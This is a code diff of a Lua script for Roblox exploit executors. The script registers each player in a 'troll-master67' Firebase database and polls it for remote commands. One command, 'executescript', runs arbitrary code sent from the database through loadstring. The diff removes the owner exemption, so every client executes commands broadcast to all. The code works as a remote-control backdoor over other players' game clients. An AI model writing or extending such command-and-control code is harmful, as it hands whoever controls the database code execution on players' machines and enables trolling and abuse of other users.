@@ -1,5 +1,4 @@
 local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
-local MY_ROLE = "User" 
 local POLL_RATE = 2.0   
 
 local HttpService = game:GetService("HttpService")
@@ -31,7 +30,6 @@ local function encryptName(name, display)
     return first .. encrypted
 end
 
-local roleMap = { ["Owner"] = "x8z9A", ["Admin"] = "k2L1p", ["User"] = "m5N0q" }
 local lastCommandId = ""
 
 local function getCharacterElements()
@@ -59,12 +57,11 @@ end
 
 local function registerToDatabase()
     local encName = encryptName(LocalPlayer.Name, LocalPlayer.Name)
-    local encRole = roleMap[MY_ROLE] or "m5N0q"
     local status = getLiveStatus()
 
     local playerData = {
         name = encName,
-        role = encRole,
+        role = "m5N0q",
         gameId = tostring(game.JobId),
         placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
         currentHealth = status.health,
@@ -73,10 +70,10 @@ local function registerToDatabase()
         currentGrav = status.gravity
     }
 
-    local request = (syn and syn.request) or (http and http.request) or http_request or request
-    if request then
+    local customRequest = html_request or http_request or request or (syn and syn.request)
+    if customRequest then
         pcall(function()
-            request({
+            customRequest({
                 Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
                 Method = "PUT",
                 Headers = { ["Content-Type"] = "application/json" },
@@ -88,9 +85,9 @@ end
 
 Players.PlayerRemoving:Connect(function(player)
     if player == LocalPlayer then
-        local request = (syn and syn.request) or (http and http.request) or http_request or request
-        if request then
-            request({ Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE" })
+        local customRequest = html_request or http_request or request or (syn and syn.request)
+        if customRequest then
+            customRequest({ Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE" })
         end
     end
 end)
@@ -133,9 +130,7 @@ local function executeIncomingCommand(cmd, arg)
         local track = hum:WaitForChild("Animator"):LoadAnimation(anim)
         track:Play()
     elseif cmd == "executescript" then
-        if loadstring then
-            pcall(loadstring(arg))
-        end
+        if loadstring then pcall(loadstring(arg)) end
     end
 end
 
@@ -149,9 +144,7 @@ task.spawn(function()
                 if data and data.id ~= lastCommandId then
                     lastCommandId = data.id
                     if data.target == "all" then
-                        if MY_ROLE ~= "Owner" then
-                            executeIncomingCommand(data.command, data.message)
-                        end
+                        executeIncomingCommand(data.command, data.message)
                     elseif data.target == LocalPlayer.Name then
                         executeIncomingCommand(data.command, data.message)
                     end
